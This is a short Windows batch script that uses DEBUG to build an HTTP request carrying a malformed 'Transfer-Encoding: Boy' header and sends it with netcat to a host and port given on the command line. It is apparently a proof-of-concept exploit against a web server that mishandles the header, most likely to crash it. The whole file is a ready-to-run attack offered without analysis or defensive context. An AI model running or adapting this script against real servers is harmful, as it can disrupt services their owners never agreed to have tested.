;if '%1'=='' echo Usage:%0 target [port]&&goto :eof
;set PORT=9999
;if not '%2'=='' set PORT=%2
;for %%n in (nc.exe) do if not exist %%~$PATH:n if not exist nc.exe 
echo Need nc.exe&&goto :eof
;DEBUG < %~s0
;GOTO :run

e 100 "GET / HTTP/1.0" 0D 0A
e 110 "Transfer-Encoding: Boy" 0D 0A 0D 0A
rcx
2A
nhttp.tmp
w
q


:run
nc %1 %PORT% < http.tmp
del http.tmp
